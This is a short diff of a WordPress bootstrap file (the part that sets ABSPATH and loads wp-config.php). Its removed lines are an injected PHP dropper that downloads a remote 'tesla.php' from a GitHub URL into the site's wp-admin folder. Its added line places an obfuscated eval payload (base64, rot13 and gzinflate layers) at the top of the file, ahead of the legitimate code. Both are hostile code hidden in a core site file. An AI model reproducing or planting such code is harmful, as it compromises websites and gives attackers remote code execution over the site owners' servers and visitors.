@@ -1,9 +1,5 @@
- <?php $nama= fopen("/home/cgwetyvz/physicallyfitct.com/wp-admin/medium.php" ,"w+");
-  $file = file_get_contents('https://raw.githubusercontent.com/prokontra/byps/main/tesla.php');
-  $tulis = fwrite ($nama ,$file);
- fclose($nama); ?>
-
- <?php
+<?php
+eval(str_rot13(gzinflate(str_rot13(base64_decode('Lc9YCoMwEAbgfaFqCCKo1DrLT6V0kSQkcIONZG9Pk9NKratuHvwfRmWb7YtsIYnXBQSRCdx3CKf3B3GYZ2c2pclUZ9g5kcHIu11l5JB2iXDucZCPgrWFuRVaf70wSfqYiHqRWxlJwsEJjsRE10hAlPoJoKzp1ohunFRa6twf6UWJ79YqC/MkNXG7TlU62d2pQQDHFPUuGBWRS13uP7D2gI8T75LQ9J83/Q8=')))))?><?php
 /**
  * Bootstrap file for setting the ABSPATH constant
  * and loading the wp-config.php file. The wp-config.php
